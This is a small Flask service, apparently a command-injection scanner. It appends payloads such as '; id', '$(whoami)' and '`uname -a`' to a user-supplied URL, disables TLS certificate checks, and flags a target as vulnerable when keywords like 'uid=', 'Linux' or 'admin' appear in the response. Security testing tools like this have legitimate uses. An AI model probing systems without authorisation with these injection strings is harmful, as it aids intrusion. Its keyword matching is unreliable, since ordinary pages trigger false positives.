from flask import Flask, request, jsonify
import requests

# Suppress warnings for unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# List of common RCE payloads
payloads = [
    "; id", "&& id", "| id", "$(id)", "`id`",
    "; uname -a", "&& uname -a", "| uname -a",
    "$(uname -a)", "`uname -a`",
    "; whoami", "&& whoami", "| whoami", "$(whoami)", "`whoami`"
]

@app.route('/scan_rce', methods=['POST'])
def scan_rce():
    data = request.json
    url = data.get('url')
    if not url:
        return jsonify({"error": "No URL provided"}), 400

    results = []
    for payload in payloads:
        try:
            # Construct the URL with the payload
            test_url = f"{url}{payload}"
            response = requests.get(test_url, verify=False, timeout=5)

            # Check for RCE indicators in the response
            if any(keyword in response.text for keyword in ["uid=", "gid=", "root", "Linux", "Darwin", "Windows", "nt authority", "admin"]):
                result = {
                    "payload": payload,
                    "url": test_url,
                    "snippet": response.text[:200]
                }
                results.append(result)

        except requests.RequestException as e:
            results.append({"error": str(e), "payload": payload})

    if results:
        return jsonify({"status": "vulnerable", "results": results})
    else:
        return jsonify({"status": "safe", "message": "No RCE vulnerabilities detected."})
